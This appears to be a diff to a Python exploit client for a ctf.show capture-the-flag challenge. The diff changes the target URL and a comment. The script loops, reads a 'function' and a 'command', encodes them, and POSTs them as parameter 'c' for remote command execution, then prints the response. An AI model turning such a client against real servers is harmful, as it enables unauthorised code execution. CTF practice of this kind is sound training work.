@@ -12,7 +12,7 @@ if (len(argv) != 2):
     print("=" * 50)
     exit(0)
 """
-url = 'http://900b8b32-4a33-4f43-85ab-7a103e85af07.challenge.ctf.show/'
+url = 'http://f68d940e-39ef-42f3-9a5d-36505f0f3b66.challenge.ctf.show/'
 
 
 # url = argv[1]
@@ -41,8 +41,8 @@ while True:
     param = action(input("\n[+] your function：")) + action(input("[+] your command："))
     print(param, "\n")
     data = {
-        'c': urllib.parse.unquote(param)  # ?c=
+        'c': urllib.parse.unquote(param)  # Payload:    ?c=
+
     }
     r = requests.post(url, data=data)
     print("\n[*] result:\n" + r.text)
-
